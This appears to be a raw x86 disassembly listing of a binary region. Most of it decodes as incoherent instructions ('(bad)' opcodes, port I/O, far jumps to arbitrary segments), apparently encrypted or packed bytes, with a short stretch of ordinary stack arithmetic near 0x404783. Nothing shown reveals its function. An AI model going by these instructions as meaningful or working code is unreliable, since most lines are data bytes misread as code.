  4042b3:	outs   dx,BYTE PTR ds:[esi]
  4042b4:	out    dx,al
  4042b5:	mov    DWORD PTR [esi+0x1f],edi
  4042b8:	xchg   BYTE PTR [edx],dh
  4042ba:	std    
  4042bb:	call   esi
  4042bd:	cdq    
  4042be:	pop    esi
  4042bf:	inc    ecx
  4042c0:	jae    0x4042a5
  4042c2:	mov    ds:0x98025d04,eax
  4042c7:	adc    BYTE PTR [eax+0x30],dl
  4042ca:	adc    BYTE PTR [edi],dl
  4042cc:	pmaddwd mm6,QWORD PTR [eax+0x3e]
  4042d0:	daa    
  4042d1:	popf   
  4042d2:	call   0x54fb370f
  4042d7:	xor    al,dl
  4042d9:	(bad)  
  4042da:	fcomip st,st(3)
  4042dc:	in     al,dx
  4042dd:	mov    dl,0x54
  4042df:	(bad)  
  4042e0:	sar    BYTE PTR [edx+0x6c],0x2a
  4042e4:	dec    edi
  4042e5:	adc    al,BYTE PTR [edx-0x279815c7]
  4042eb:	push   0x7f9fca25
  4042f0:	xor    edx,DWORD PTR [eax]
  4042f2:	and    bl,BYTE PTR [edi+0x6d]
  4042f5:	xchg   ecx,eax
  4042f6:	enter  0x4c4d,0x56
  4042fa:	fwait
  4042fb:	mov    bl,BYTE PTR [eax]
  4042fd:	outs   dx,BYTE PTR ds:[esi]
  4042fe:	aam    0x4d
  404300:	pop    es
  404301:	mov    ebp,0x660b7567
  404306:	add    eax,0xd3a6b0cc
  40430b:	clc    
  40430c:	cmp    ah,BYTE PTR [esi+0x72fc60bb]
  404312:	or     ch,bl
  404314:	add    BYTE PTR [esi-0x43],dh
  404317:	mov    BYTE PTR [ebx],cl
  404319:	cmp    esi,DWORD PTR [ecx-0x75]
  40431c:	mov    edi,0xe384b5e9
  404321:	fnstcw WORD PTR [ebx+0x21]
  404324:	adc    BYTE PTR [ebp+0x61],ah
  404327:	xchg   DWORD PTR [ebx-0x6dba3942],esp
  40432d:	add    esi,DWORD PTR [eax+0x33800a9d]
  404333:	xchg   esi,eax
  404334:	fsub   DWORD PTR [ebx+0x2b]
  404337:	xchg   BYTE PTR [eax],bh
  404339:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40433a:	dec    ecx
  40433b:	jg     0x4042f0
  40433d:	loop   0x404341
  40433f:	sti    
  404340:	sub    ebp,DWORD PTR [ebp+0x76a57685]
  404346:	std    
  404347:	or     eax,0xbe50135
  40434c:	in     al,dx
  40434d:	lahf   
  40434e:	sbb    al,0xac
  404350:	push   0xffffffc6
  404352:	into   
  404353:	lock fadd st,st(2)
  404356:	shl    DWORD PTR gs:[eax-0x1e],0x1f
  40435b:	mov    eax,0x4ffba882
  404360:	jecxz  0x404399
  404362:	cs ds ret 
  404365:	sbb    ecx,edx
  404367:	push   fs
  404369:	push   esi
  40436a:	aad    0xb6
  40436c:	jns    0x404333
  40436e:	(bad)  
  40436f:	cmc    
  404370:	scas   eax,DWORD PTR es:[edi]
  404371:	xchg   bl,dh
  404373:	or     edx,edx
  404375:	cmp    al,0x8e
  404377:	in     al,0xc4
  404379:	scas   eax,DWORD PTR es:[edi]
  40437a:	stos   DWORD PTR es:[edi],eax
  40437b:	addr16 int3 
  40437d:	test   DWORD PTR [ebx-0x28],0x3a1cdf25
  404384:	xchg   esp,eax
  404385:	icebp  
  404386:	jecxz  0x404390
  404388:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404389:	push   eax
  40438a:	cld    
  40438b:	add    DWORD PTR [esi-0x9],edx
  40438e:	cld    
  40438f:	(bad)  
  404390:	jge    0x4043cf
  404392:	xor    edi,edx
  404394:	sbb    eax,0xffffff8d
  404397:	loop   0x404387
  404399:	out    0xd0,al
  40439b:	pop    esp
  40439c:	push   eax
  40439e:	mov    BYTE PTR ds:0x2782f5fe,0xe3
  4043a5:	or     edx,DWORD PTR [esi+0x5f67e9e1]
  4043ab:	call   0x5ce5:0x16cbf397
  4043b2:	xchg   edi,eax
  4043b3:	in     eax,0x10
  4043b5:	and    al,0xb9
  4043b7:	div    bh
  4043b9:	les    ecx,FWORD PTR [edi]
  4043bb:	cmp    ah,BYTE PTR [eax+0x71]
  4043be:	jl     0x404352
  4043c0:	push   ebp
  4043c1:	jns    0x40435a
  4043c3:	(bad)  
  4043c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043c5:	or     DWORD PTR [ebx],ebx
  4043c7:	sub    ax,0xa386
  4043cb:	jmp    0x404377
  4043cd:	push   ecx
  4043ce:	sbb    BYTE PTR [esi+0x7e410339],bl
  4043d4:	mov    ebp,0x9a947dff
  4043d9:	scas   al,BYTE PTR es:[edi]
  4043da:	iret   
  4043db:	into   
  4043dc:	pushf  
  4043dd:	retf   
  4043de:	mov    eax,ds:0x2e012ce
  4043e3:	mov    ds:0xaab4a90d,eax
  4043e8:	ja     0x404459
  4043ea:	in     eax,dx
  4043eb:	fwait
  4043ec:	jecxz  0x4043f9
  4043ee:	out    dx,al
  4043ef:	rol    DWORD PTR [edi-0x22],cl
  4043f2:	pop    es
  4043f3:	imul   ecx,DWORD PTR [ebx+0x692a7e08],0xffffffc5
  4043fa:	mov    bh,0xbb
  4043fc:	pop    ebp
  4043fd:	scas   al,BYTE PTR es:[edi]
  4043fe:	sar    BYTE PTR [ebx+0x323807c4],cl
  404404:	fwait
  404405:	add    BYTE PTR [ecx],0x62
  404408:	or     eax,0x6ce80b7b
  40440d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40440e:	or     al,0xb4
  404410:	adc    eax,0x5e08ae3c
  404415:	cmc    
  404416:	adc    ah,BYTE PTR [edi-0x1a]
  404419:	sbb    dl,ah
  40441b:	leave  
  40441c:	fdiv   QWORD PTR [eax]
  40441e:	sbb    esi,esi
  404420:	fnstenv [eax]
  404422:	push   ebx
  404423:	jne    0x40442e
  404425:	jle    0x4043ea
  404427:	cmp    ecx,DWORD PTR [ebx]
  404429:	cmp    eax,0x85e64d38
  40442e:	imul   edi,DWORD PTR [edx-0x42],0x1b
  404432:	out    dx,eax
  404433:	lea    ebp,[edi-0x23]
  404436:	mov    ah,0x95
  404438:	int    0xf4
  40443a:	cli    
  40443b:	data16 std 
  40443d:	and    DWORD PTR [edi],edx
  40443f:	and    ecx,DWORD PTR [ecx-0x559d59d6]
  404445:	jmp    0x4044c1
  404447:	and    al,0x4b
  404449:	xlat   BYTE PTR ds:[ebx]
  40444a:	jns    0x4044ab
  40444c:	fdiv   DWORD PTR [edi+0x3563c726]
  404452:	shl    eax,cl
  404454:	dec    esi
  404455:	(bad)  [eax-0x7544af82]
  40445b:	pop    ecx
  40445c:	cdq    
  40445d:	cmp    ebx,DWORD PTR [ebx-0x18d98246]
  404463:	lahf   
  404464:	fcomp  st(5)
  404466:	nop    ebx
  404469:	leave  
  40446a:	imul   edi,DWORD PTR [ebx-0x5fedeff4],0x60fe0d2e
  404474:	xchg   edx,eax
  404475:	(bad)  
  404476:	repz or DWORD PTR [eax],ebx
  404479:	(bad)  
  40447a:	sar    BYTE PTR [ebx+esi*1-0x8],cl
  40447e:	jmp    0x404781
  404483:	add    bl,BYTE PTR [ebp+0x44]
  404486:	dec    ecx
  404487:	popa   
  404488:	jno    0x40449d
  40448a:	jne    0x4044e2
  40448c:	xor    al,0xa0
  40448e:	jle    0x404487
  404490:	stc    
  404491:	dec    edx
  404492:	stos   DWORD PTR es:[edi],eax
  404493:	pop    esi
  404494:	sbb    BYTE PTR [esi+0x7e],bh
  404497:	pop    eax
  404498:	jl     0x404518
  40449a:	jle    0x404436
  40449c:	cs out dx,eax
  40449e:	adc    esi,esi
  4044a0:	test   al,0x25
  4044a2:	pop    ecx
  4044a3:	inc    ecx
  4044a4:	xchg   ebp,eax
  4044a5:	pop    ecx
  4044a6:	repz add BYTE PTR [esi+edx*1],dl
  4044aa:	or     BYTE PTR [ebp-0x3aa5dc94],cl
  4044b0:	mov    ah,0xb1
  4044b2:	jl     0x404472
  4044b4:	and    DWORD PTR [esp+eiz*2],ebp
  4044b7:	dec    esp
  4044b8:	out    0x9e,eax
  4044ba:	mov    ebp,0x705dd2d8
  4044bf:	cmp    BYTE PTR [esp+edx*4],0x50
  4044c3:	inc    esp
  4044c4:	mov    ebp,0xb948b16e
  4044c9:	cwde   
  4044ca:	addr16 ret 0x335d
  4044ce:	mov    WORD PTR ds:0xcdd1afbc,gs
  4044d4:	dec    esp
  4044d5:	sub    bl,BYTE PTR [esi]
  4044d7:	xchg   esi,eax
  4044d8:	shl    bh,1
  4044da:	mov    bl,0x1e
  4044dc:	ss jb  0x404492
  4044df:	mov    bl,bl
  4044e1:	ds mov esp,cs
  4044e4:	leave  
  4044e5:	in     eax,0x5c
  4044e7:	xor    bl,bh
  4044e9:	push   0xefdd9f87
  4044ee:	jl     0x404493
  4044f0:	jbe    0x404551
  4044f2:	fs mov ch,0x96
  4044f5:	jmp    0xda6:0x786b72ba
  4044fc:	pop    es
  4044fd:	mov    al,ds:0x47b5975e
  404502:	fld    QWORD PTR [ebp-0x39625638]
  404508:	mov    DWORD PTR [ebx],eax
  40450a:	mov    dl,0x3d
  40450c:	cmp    DWORD PTR [ecx-0x6f],ecx
  40450f:	sub    BYTE PTR [ebp+0x56],dl
  404512:	sbb    al,0x44
  404514:	bound  esi,QWORD PTR [ebp-0x49b32de7]
  40451a:	into   
  40451b:	hlt    
  40451c:	push   ebp
  40451d:	aam    0xcc
  40451f:	xor    DWORD PTR [edx-0x2a],ecx
  404522:	sub    ecx,esp
  404524:	enter  0x4922,0xcf
  404528:	add    dh,BYTE PTR [eax+0x5b308527]
  40452e:	or     DWORD PTR [edi+eax*1-0x3c1ff1f8],edx
  404535:	rol    DWORD PTR [ebx-0x5],0x43
  404539:	mov    bl,0x82
  40453b:	or     ch,BYTE PTR [ebx]
  40453d:	push   ebx
  40453e:	aaa    
  40453f:	inc    edi
  404540:	rcr    DWORD PTR [eax],0xe9
  404543:	popf   
  404544:	xlat   BYTE PTR ds:[ebx]
  404545:	nop
  404546:	jb     0x404597
  404548:	inc    edi
  404549:	pop    ds
  40454a:	jecxz  0x4045bc
  40454c:	pushf  
  40454d:	mov    ds:0x243f0a53,al
  404552:	adc    BYTE PTR [ebp-0x63],bh
  404555:	xor    BYTE PTR [edx],0xec
  404558:	dec    BYTE PTR [ecx-0x49b11d6]
  40455e:	leave  
  40455f:	mov    bl,0x46
  404561:	cwde   
  404562:	mov    eax,0xb458116c
  404567:	std    
  404568:	mov    eax,0x261fc563
  40456d:	jne    0x404578
  40456f:	ins    BYTE PTR es:[edi],dx
  404570:	ret    
  404571:	mov    bl,0x4e
  404573:	pop    edi
  404574:	or     DWORD PTR [eax+eax*8],eax
  404577:	mov    bh,0x4a
  404579:	scas   al,BYTE PTR es:[edi]
  40457a:	test   al,0xfb
  40457c:	adc    DWORD PTR [ecx],edx
  40457e:	rcl    DWORD PTR [esi-0x1566c05f],cl
  404584:	sbb    BYTE PTR [ebx],ah
  404586:	adc    eax,0x43a72d36
  40458b:	leave  
  40458c:	jo     0x404520
  40458e:	out    dx,al
  40458f:	or     eax,0x56e7e0c1
  404594:	lds    ebp,FWORD PTR [eax+0x66]
  404597:	repz jnp 0x40459f
  40459a:	dec    ebx
  40459b:	in     al,dx
  40459c:	adc    DWORD PTR [eax+0x6c9df5f4],edx
  4045a2:	dec    esi
  4045a3:	pushf  
  4045a4:	pushf  
  4045a5:	inc    ebp
  4045a6:	jl     0x40455e
  4045a8:	push   edx
  4045a9:	daa    
  4045aa:	sub    bh,BYTE PTR [ebx+0x52]
  4045ad:	scas   al,BYTE PTR es:[edi]
  4045ae:	and    BYTE PTR ss:[ecx+0x40],ah
  4045b2:	mov    eax,0x2549fd6e
  4045b7:	(bad)  
  4045b9:	push   esp
  4045ba:	lods   al,BYTE PTR ds:[esi]
  4045bb:	mov    cl,0x9e
  4045bd:	sbb    eax,0xb11f4034
  4045c2:	data16 jne 0x4045f8
  4045c5:	gs sbb eax,0xeecbe247
  4045cb:	fcom   st(1)
  4045cd:	aam    0xda
  4045cf:	cmp    al,al
  4045d1:	sub    DWORD PTR [esi-0x9],edi
  4045d4:	jp     0x40463a
  4045d6:	or     DWORD PTR [ebx],ebp
  4045d8:	(bad)  
  4045d9:	mov    DWORD PTR [ebx+0xc],edx
  4045dc:	sub    BYTE PTR [ecx+0x6e],al
  4045df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045e0:	aas    
  4045e1:	adc    eax,0xa97705a
  4045e6:	ins    DWORD PTR es:[edi],dx
  4045e7:	add    DWORD PTR ds:[ecx-0x4e],ecx
  4045eb:	fcomp  st(7)
  4045ed:	inc    edi
  4045ee:	(bad)  
  4045ef:	mov    esp,0x3c9665f7
  4045f4:	in     al,0xfe
  4045f6:	adc    dl,ah
  4045f8:	push   ds
  4045f9:	sar    DWORD PTR [esp+esi*2],1
  4045fc:	div    DWORD PTR [edi]
  4045fe:	and    BYTE PTR [edx+edi*4],ah
  404601:	and    BYTE PTR [edx],cl
  404603:	mov    bl,0x56
  404605:	mov    ds:0xdc78b5db,al
  40460a:	cmp    al,0x11
  40460c:	jp     0x4045f3
  40460e:	shl    BYTE PTR [ecx-0x1a875b0c],1
  404614:	xor    DWORD PTR [ecx],eax
  404616:	(bad)  
  404617:	push   edx
  404618:	or     ah,dh
  40461a:	sub    cl,BYTE PTR [edi]
  40461c:	push   edx
  40461d:	jmp    0xc4576c1d
  404622:	rol    ecx,1
  404624:	(bad)  
  404625:	rcr    BYTE PTR [esi],1
  404627:	push   ecx
  404628:	xor    BYTE PTR [edx+0x32],al
  40462b:	push   ebx
  40462c:	ret    
  40462d:	(bad)  
  40462e:	in     eax,0x48
  404630:	repz pop ebp
  404632:	mov    ah,0xcd
  404634:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404635:	push   cs
  404636:	sbb    bh,al
  404638:	sbb    DWORD PTR [ebp-0x6562b1c3],0x2f34a520
  404642:	sbb    eax,0xef0f6df5
  404647:	out    dx,al
  404648:	icebp  
  404649:	mov    al,ds:0xdfec7ff5
  40464e:	dec    edi
  40464f:	in     al,dx
  404650:	or     eax,0x8ecce99e
  404655:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404656:	mov    dh,0x9f
  404658:	je     0x404616
  40465a:	dec    DWORD PTR [edx-0x36bcd87f]
  404660:	loopne 0x404675
  404662:	mov    bh,0x71
  404664:	sahf   
  404665:	add    ch,BYTE PTR [esi-0x36b51e7b]
  40466b:	enter  0x74e3,0xd2
  40466f:	ficomp WORD PTR [edx-0x4d]
  404672:	jge    0x404674
  404674:	arpl   bx,cx
  404676:	pushf  
  404677:	sbb    al,0xb8
  404679:	stos   DWORD PTR es:[edi],eax
  40467a:	adc    bh,bl
  40467c:	fld    TBYTE PTR [ebp-0x3c]
  40467f:	test   BYTE PTR [edx-0x21],bl
  404682:	xchg   ebx,eax
  404683:	call   0x7fc5:0xfff1a5c2
  40468a:	js     0x4046b2
  40468c:	(bad)  
  40468d:	cs add eax,0xb2c5785b
  404693:	shl    BYTE PTR [esi],cl
  404695:	adc    al,0x16
  404697:	shl    ebp,cl
  404699:	repnz push eax
  40469b:	fld    DWORD PTR [ecx+edi*1]
  40469e:	div    BYTE PTR [eax+0x376f23f7]
  4046a4:	retf   0xfe8d
  4046a7:	dec    esi
  4046a8:	or     ecx,DWORD PTR [esi+0x75]
  4046ab:	cmp    ch,bl
  4046ad:	sub    dh,dl
  4046af:	inc    edx
  4046b0:	icebp  
  4046b1:	mov    ss,ebp
  4046b3:	cmp    al,0xfc
  4046b5:	jmp    0x4046a2
  4046b7:	xchg   ebx,eax
  4046b8:	call   0x517e:0x1a637448
  4046bf:	push   esp
  4046c0:	std    
  4046c1:	mov    WORD PTR [edx],es
  4046c3:	mov    WORD PTR [ebp-0x7ba79832],?
  4046c9:	outs   dx,BYTE PTR ds:[esi]
  4046ca:	push   cs
  4046cb:	pusha  
  4046cc:	push   0xffffffe8
  4046ce:	sub    eax,DWORD PTR [edx-0x51]
  4046d1:	sub    bh,dh
  4046d3:	nop
  4046d4:	cmp    esp,ecx
  4046d6:	aas    
  4046d7:	repnz sbb eax,0xafaf0de0
  4046dd:	stos   BYTE PTR es:[edi],al
  4046de:	sub    al,ch
  4046e0:	push   esp
  4046e1:	jns    0x404665
  4046e3:	stc    
  4046e4:	push   0x21269f5b
  4046e9:	pop    ss
  4046ea:	sbb    BYTE PTR [ebp+edi*2-0x2ab8217e],al
  4046f1:	imul   edi,DWORD PTR [esi-0x6acdcf43],0xb5746b0d
  4046fb:	mov    edx,0x3454ebe5
  404700:	ret    
  404701:	pop    ecx
  404702:	(bad)  
  404703:	ficom  WORD PTR [edi+ebp*1+0x38]
  404707:	xor    DWORD PTR [edi-0x43],ebp
  40470a:	fwait
  40470b:	cmp    al,0x96
  40470d:	sti    
  40470e:	iret   
  40470f:	pop    eax
  404710:	popf   
  404711:	dec    ecx
  404712:	outs   dx,DWORD PTR ds:[esi]
  404713:	cli    
  404714:	xor    BYTE PTR [esi+0x6f68c083],0xe4
  40471b:	cmp    eax,0xa5e3e9d7
  404720:	cmp    DWORD PTR [eax-0x64],edx
  404723:	inc    eax
  404724:	mov    ss,WORD PTR [ecx+0x79]
  404727:	sbb    BYTE PTR ds:0x76e45859,dh
  40472d:	inc    esp
  40472e:	cmp    DWORD PTR [ebp+0x6f],ebp
  404731:	inc    edx
  404732:	int3   
  404733:	pop    esi
  404734:	and    eax,0x9b2dba73
  404739:	dec    eax
  40473a:	pop    es
  40473b:	scas   eax,DWORD PTR es:[edi]
  40473c:	sbb    al,0x64
  40473e:	jne    0x404786
  404740:	fcom   st(1)
  404742:	lahf   
  404743:	sbb    BYTE PTR [esi],0xbe
  404746:	pop    ebp
  404747:	fidiv  WORD PTR [ecx-0x2d864418]
  40474d:	enter  0x507c,0xf7
  404751:	(bad)  
  404752:	fisttp DWORD PTR [ecx-0x6f]
  404755:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404756:	(bad)  
  404757:	push   ebp
  404758:	fist   WORD PTR [esi-0x1b]
  40475b:	add    dh,BYTE PTR es:[ecx+0x5c654bf]
  404762:	loopne 0x4047da
  404764:	imul   ebp,DWORD PTR [edi+0x5f],0x18
  404768:	rol    BYTE PTR [eax-0x2b],1
  40476b:	sub    eax,edi
  40476d:	es mov edi,0x8728bef5
  404773:	dec    ebp
  404774:	(bad)  
  404775:	mov    edi,0x9979312f
  40477a:	cld    
  40477b:	add    DWORD PTR [edi-0x50],esi
  40477e:	jmp    0xd0739b66
  404783:	add    edi,ecx
  404785:	add    edx,ecx
  404787:	imul   edx,edi
  40478a:	mov    DWORD PTR [ebp+0xc],edx
  40478d:	mov    edx,DWORD PTR [ebp+0xc]
  404790:	mov    DWORD PTR [ebp-0x24],edx
  404793:	mov    edx,DWORD PTR [ebp-0x8]
  404796:	add    edx,DWORD PTR [ebp-0x40]
  404799:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  4047a0:	mov    DWORD PTR [ebp-0x1c],edx
  4047a3:	jmp    0x404aa6
  4047a8:	sub    ch,BYTE PTR [eax+edi*1+0x6b69b8ad]
  4047af:	test   eax,0xf2c2fa45
  4047b4:	(bad)  
  4047b5:	bound  ecx,QWORD PTR es:[eax+edi*4+0x27]
  4047ba:	jle    0x40483a
  4047bc:	pop    eax
  4047bd:	jl     0x40483d
  4047bf:	jle    0x404788
  4047c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4047c2:	pop    edi
  4047c3:	(bad)  
  4047c4:	mov    ebx,0x7bb44e46
  4047c9:	lock dec edx
  4047cb:	jns    0x4047cf
  4047cd:	ret    0xd9ce
  4047d0:	cli    
  4047d1:	and    esp,ecx
  4047d3:	adc    eax,0x3a65b2f7
  4047d8:	pop    es
  4047d9:	add    DWORD PTR [edi-0x5e],eax
  4047dc:	adc    BYTE PTR [eax+0x52],0xdd
  4047e0:	aam    0xb1
  4047e2:	jno    0x4047f8
  4047e4:	mov    edi,0x7d43da65
  4047e9:	sbb    dl,ch
  4047eb:	inc    BYTE PTR [ebx+0x76daed42]
  4047f1:	add    BYTE PTR [ecx-0x56],ah
  4047f4:	push   edi
  4047f5:	in     eax,0x89
  4047f7:	stos   BYTE PTR es:[edi],al
  4047f8:	cmp    al,0xca
  4047fa:	call   0xb469:0xa14a29dd
  404801:	xchg   ebp,eax
  404802:	inc    ecx
  404803:	adc    eax,0x45acad49
  404808:	outs   dx,DWORD PTR ds:[esi]
  404809:	sbb    al,0xbf
  40480b:	pop    ss
  40480c:	je     0x40485a
  40480e:	ret    0x1c6d
  404811:	jmp    0x66a3:0xbeac3fc0
  404818:	outs   dx,BYTE PTR ds:[esi]
  404819:	mov    ecx,0xf49c7b56
  40481e:	or     BYTE PTR [esi+ecx*1-0x14],bl
  404822:	outs   dx,DWORD PTR ds:[esi]
  404823:	push   ebp
  404824:	adc    ebx,DWORD PTR [ecx-0x42]
  404827:	mov    ch,0x97
  404829:	jmp    0x40482c
  40482b:	into   
  40482c:	jle    0x404892
  40482e:	adc    BYTE PTR ds:0xc238605d,0x8f
  404835:	xchg   ecx,eax
  404836:	cdq    
  404837:	cwde   
  404838:	out    dx,eax
  404839:	and    cl,bl
  40483b:	test   eax,0xe3e0b1f1
  404840:	les    esi,FWORD PTR [edx+ecx*8-0x1a557162]
  404847:	iret   
  404848:	and    esp,edx
  40484a:	mov    bh,0x82
  40484c:	xchg   esp,eax
  40484d:	mov    ecx,0x7069cf85
  404852:	push   edi
  404853:	inc    esi
  404854:	or     BYTE PTR [ebx],cl
  404856:	retf   0xc63d
  404859:	mov    DWORD PTR [edx-0x73900c9c],ebx
  40485f:	dec    eax
  404860:	in     al,dx
  404861:	scas   eax,DWORD PTR es:[edi]
  404862:	push   ecx
  404863:	scas   al,BYTE PTR es:[edi]
  404864:	dec    edx
  404865:	mov    esi,DWORD PTR [edx-0x19]
  404868:	sti    
  404869:	jnp    0x404801
  40486b:	ins    DWORD PTR es:[edi],dx
  40486c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40486d:	cmp    dl,BYTE PTR [edi]
  40486f:	mov    BYTE PTR [ebx],cl
  404871:	enter  0x6306,0xd4
  404875:	sahf   
  404876:	and    esi,edx
  404878:	push   cs
  404879:	mov    al,ds:0x9e244976
  40487e:	(bad)  
  404880:	mov    ch,0xc1
  404882:	fyl2xp1 
  404884:	xor    al,0xf7
  404886:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404887:	(bad)  
  404889:	test   al,0xf2
  40488b:	mov    al,ds:0x8d819231
  404890:	in     eax,0xb1
  404892:	push   cs
  404893:	stc    
  404894:	popa   
  404895:	dec    ebp
  404896:	mov    ds:0x1f3f1521,al
  40489b:	in     al,dx
  40489c:	ins    DWORD PTR es:[edi],dx
  40489d:	or     BYTE PTR [ebx-0x719c27e9],al
  4048a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4048a4:	int    0x61
  4048a6:	cmp    edi,DWORD PTR [ebx+0x1c55f183]
  4048ac:	xor    eax,0xbf073a3e
  4048b1:	not    BYTE PTR [esi+ebp*8+0x3f]
  4048b5:	je     0x404903
  4048b7:	mov    bl,BYTE PTR [edx]
  4048b9:	inc    eax
  4048ba:	mov    dh,0x94
  4048bc:	adc    edi,edx
  4048be:	jb     0x40490e
  4048c0:	sub    ah,BYTE PTR [ebp-0x55]
  4048c3:	xchg   ebp,eax
  4048c4:	xchg   esi,eax
  4048c5:	sahf   
  4048c6:	sub    ch,BYTE PTR [eax+0x38]
  4048c9:	mov    cl,0x87
  4048cb:	add    ebx,edi
  4048cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4048ce:	cli    
  4048cf:	pop    edx
  4048d0:	popf   
  4048d1:	lods   al,BYTE PTR ds:[esi]
  4048d2:	sbb    eax,0x10fe2398
  4048d7:	and    eax,0x27f7a596
  4048dc:	aas    
  4048dd:	call   0x9501:0x299f99ff
  4048e4:	nop
  4048e5:	add    al,0xfc
  4048e7:	mov    cl,0x29
  4048e9:	in     al,dx
  4048ea:	enter  0x1890,0x4a
  4048ee:	fdiv   DWORD PTR [eax+edi*8-0x8]
  4048f2:	pop    esi
  4048f3:	jmp    0xbcc:0x7ceb3535
  4048fa:	fxch   st(7)
  4048fc:	pop    ebx
  4048fd:	xchg   DWORD PTR [edx+0x3a0901b5],ebp
  404903:	fiadd  WORD PTR [eax+0x70848bb5]
  404909:	hlt    
  40490a:	out    0xa7,eax
  40490c:	adc    eax,0xc75ee6a5
  404911:	xor    dl,dh
  404913:	push   ecx
  404914:	mov    ss,esi
  404916:	and    dl,al
  404918:	mov    edx,0x56b5d8c
  40491d:	sub    esp,DWORD PTR [ebx-0x6a]
  404920:	jbe    0x404911
  404922:	and    BYTE PTR [edx-0x147a7ce7],cl
  404928:	pop    ds
  404929:	xchg   al,ch
  40492b:	(bad)  
  40492c:	ficom  DWORD PTR [ecx]
  40492e:	call   0xa9ff:0x6925d3da
  404935:	leave  
  404936:	div    DWORD PTR [ebp-0x1f85e602]
  40493c:	xchg   DWORD PTR [ecx+0x15e73f5],ecx
  404942:	cld    
  404943:	mov    bl,0x54
  404945:	cmp    esp,esi
  404947:	dec    esp
  404948:	dec    ebp
  404949:	idiv   DWORD PTR [edx+eax*4-0x1fccb57d]
  404950:	pop    ebx
  404951:	and    BYTE PTR [ebp+esi*1-0x6f47d98b],0x92
  404959:	ret    
  40495a:	mov    edx,0x3aadb7e3
  40495f:	out    dx,al
  404960:	adc    esi,DWORD PTR [eax-0x273ef6b]
  404966:	jmp    0x40493e
  404968:	fcomip st,st(5)
  40496a:	mov    fs,WORD PTR [esi+0x1]
  40496d:	test   BYTE PTR [edx-0x58c48f12],bl
  404973:	shr    DWORD PTR [ebx],cl
  404975:	jmp    0xb527:0x53e0280f
  40497c:	cli    
  40497d:	sub    DWORD PTR [edi],ecx
  40497f:	adc    eax,0x28737c84
  404984:	lahf   
  404985:	fnstcw WORD PTR [edi+0x38]
  404988:	mov    eax,ds:0x3d3a08cc
  40498d:	inc    esp
  40498e:	fsubr  QWORD PTR [ebp-0x3a]
  404991:	pop    ds
  404992:	push   eax
  404993:	pop    edx
  404994:	sub    cl,ch
  404996:	xchg   edx,eax
  404997:	cmp    al,0x68
  404999:	popa   
  40499a:	dec    eax
  40499b:	clc    
  40499c:	fild   QWORD PTR [ecx]
  40499e:	mov    dl,0xb
  4049a0:	ds or  dh,cl
  4049a3:	push   0x1b
  4049a5:	call   0xe738:0xb8a77737
  4049ac:	mov    ecx,0xa81262ed
  4049b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049b2:	lock pop edi
  4049b4:	cmp    edx,DWORD PTR [ebx+ebp*4+0x724a9731]
  4049bb:	or     eax,esi
  4049bd:	sub    BYTE PTR [ecx-0x14ba02e2],0xa5
  4049c4:	adc    dh,dl
  4049c6:	lds    ecx,FWORD PTR [ebx]
  4049c8:	jp     0x40496b
  4049ca:	shr    ah,0x28
  4049cd:	ins    BYTE PTR es:[edi],dx
  4049ce:	inc    edx
  4049cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049d0:	mov    es,WORD PTR [edx-0x3]
  4049d3:	(bad)
  4049d6:	gs and eax,0x2253d614
  4049dc:	stc    
  4049dd:	cmp    eax,0xc8dec9dc
  4049e2:	cld    
  4049e3:	sub    al,0xd3
  4049e5:	pop    esi
  4049e6:	in     al,0xad
  4049e8:	or     ebx,DWORD PTR [esi]
  4049ea:	or     BYTE PTR [ebx-0x80],bl
  4049ed:	repz xor ecx,DWORD PTR [edi]
  4049f0:	sbb    BYTE PTR [esi-0x5b11f4c5],bh
  4049f6:	pop    es
  4049f7:	mov    ecx,0x69e7565a
  4049fc:	add    dh,cl
  4049fe:	fldenv [ebx-0x7b397d14]
  404a04:	xor    BYTE PTR [edi-0x15a85031],dl
  404a0a:	pop    ss
  404a0b:	cmp    esi,0xffffffa7
  404a0e:	gs cmp al,ah
  404a11:	dec    esi
  404a12:	or     ecx,DWORD PTR fs:[edx-0x29]
  404a16:	bound  ebp,QWORD PTR [eax]
  404a18:	outs   dx,DWORD PTR ds:[esi]
  404a19:	mov    dh,0xfc
  404a1b:	dec    esp
  404a1c:	aad    0x59
  404a1e:	sbb    ah,BYTE PTR [edx+0x3a]
  404a21:	dec    edi
  404a22:	lahf   
  404a23:	jnp    0x404a26
  404a25:	pop    ss
  404a26:	out    0x7b,al
  404a28:	(bad)  
  404a29:	fdivr  DWORD PTR [ebx+0x4d]
  404a2c:	xchg   DWORD PTR [edx-0x56871e10],esi
  404a32:	(bad)  
  404a33:	jle    0x4049ff
  404a35:	adc    ebx,DWORD PTR [ecx-0x3e9d56b0]
  404a3b:	gs loopne 0x404a2d
  404a3e:	(bad)  
  404a3f:	and    DWORD PTR [ebp-0x3e61cec5],edx
  404a45:	jne    0x404a14
  404a47:	(bad)  
  404a48:	jle    0x4049f5
  404a4a:	stos   BYTE PTR es:[edi],al
  404a4b:	outs   dx,BYTE PTR ds:[esi]
  404a4c:	mov    ah,0xdc
  404a4e:	ret    
  404a4f:	mov    dh,0x9a
  404a51:	mov    ds:0xdc64efa7,eax
  404a56:	int3   
  404a57:	ja     0x4049ee
  404a59:	sub    DWORD PTR [edi],esi
  404a5b:	(bad)
  404a5f:	out    0x48,al
  404a61:	push   esi
  404a62:	jne    0x404a41
  404a64:	push   cs
  404a65:	cmp    bh,BYTE PTR [ecx]
  404a67:	std    
  404a68:	jg     0x404a4c
  404a6a:	in     al,dx
  404a6b:	inc    eax
  404a6c:	cmp    edx,edx
  404a6e:	xlat   BYTE PTR ds:[ebx]
